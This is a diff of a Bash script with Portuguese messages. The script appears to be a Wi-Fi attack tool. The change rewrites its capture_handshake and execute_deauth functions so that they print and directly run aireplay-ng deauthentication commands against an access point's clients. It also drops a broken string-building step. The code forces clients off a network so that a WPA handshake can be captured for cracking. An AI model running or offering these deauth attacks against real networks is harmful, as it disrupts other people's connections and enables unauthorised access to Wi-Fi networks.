@@ -223,11 +223,11 @@ capture_handshake() {
     
     echo -e "${GREEN}[+] Airodump-ng rodando (PID: $airodump_pid)${NC}"
     echo -e "${YELLOW}[*] Para forçar reconexão, execute em outro terminal:${NC}"
-    echo -e "${CYAN}sudo aireplay-ng --deauth 10 -a $BSSID"
     if [[ -n "$CLIENT_MAC" ]]; then
-        echo -e "-c $CLIENT_MAC"
+        echo -e "${CYAN}sudo aireplay-ng --deauth 10 -a $BSSID -c $CLIENT_MAC $MONITOR_INTERFACE${NC}\n"
+    else
+        echo -e "${CYAN}sudo aireplay-ng --deauth 10 -a $BSSID $MONITOR_INTERFACE${NC}\n"
     fi
-    echo -e "$MONITOR_INTERFACE${NC}\n"
     
     echo -e "${YELLOW}[*] Ou execute esta função novamente para fazer deauth automático${NC}"
     echo -e "${YELLOW}[*] Pressione Enter quando capturar o handshake...${NC}"
@@ -282,20 +282,15 @@ execute_deauth() {
         deauth_count=$input
     fi
     
-    local cmd="aireplay-ng --deauth $deauth_count -a $BSSID"
-    
     if [[ -n "$CLIENT_MAC" ]]; then
-        cmd="$cmd -c $CLIENT_MAC"
         echo -e "${YELLOW}[*] Atacando cliente específico: $CLIENT_MAC${NC}"
+        echo -e "${GREEN}[+] Executando: aireplay-ng --deauth $deauth_count -a $BSSID -c $CLIENT_MAC $MONITOR_INTERFACE${NC}\n"
+        aireplay-ng --deauth $deauth_count -a "$BSSID" -c "$CLIENT_MAC" "$MONITOR_INTERFACE"
     else
         echo -e "${YELLOW}[*] Atacando todos os clientes do AP${NC}"
+        echo -e "${GREEN}[+] Executando: aireplay-ng --deauth $deauth_count -a $BSSID $MONITOR_INTERFACE${NC}\n"
+        aireplay-ng --deauth $deauth_count -a "$BSSID" "$MONITOR_INTERFACE"
     fi
-    
-    cmd="$cmd $MONITOR_INTERFACE"
-    
-    echo -e "${GREEN}[+] Executando: $cmd${NC}\n"
-    
-    $cmd
     
     echo -e "\n${GREEN}[+] Ataque deauth concluído${NC}"
     echo -e "${YELLOW}[*] Verifique se o handshake foi capturado${NC}"
